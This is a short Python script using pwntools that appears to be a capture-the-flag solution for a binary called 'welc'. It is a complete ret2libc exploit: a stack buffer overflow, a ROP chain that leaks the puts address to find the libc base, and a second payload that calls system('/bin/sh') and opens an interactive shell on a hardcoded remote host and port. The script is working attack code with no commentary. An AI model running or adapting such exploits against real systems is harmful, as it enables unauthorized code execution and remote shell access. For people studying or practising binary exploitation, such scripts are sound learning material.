from pwn import *
# HOST 20.216.39.14
# PORT 1237
elf = ELF("./welc")
libc = ELF("./libc.so.6")
rop = ROP(elf)
offset = 136
payload = b"A"*offset
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0])
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.symbols["main"])
p = remote("20.216.39.14", 1237)
p.sendline(payload)
p.recvuntil(b"you ?\n")
leak = u64(p.recvline().strip().ljust(8, b'\x00')) # Leak puts() address
log.info(f"Leak: {hex(leak)}")
libc.address = leak - libc.symbols["puts"]
binsh        = next(libc.search(b'/bin/sh')) # Find /bin/sh address
system       = libc.symbols['system'] # Find system() address
payload2 = b"a"*offset
payload2 += p64(rop.find_gadget(["pop rdi", "ret"])[0])
payload2 += p64(binsh)
payload2 += p64(0x40101a)
payload2 += p64(system)
p.sendline(payload2)
p.interactive()

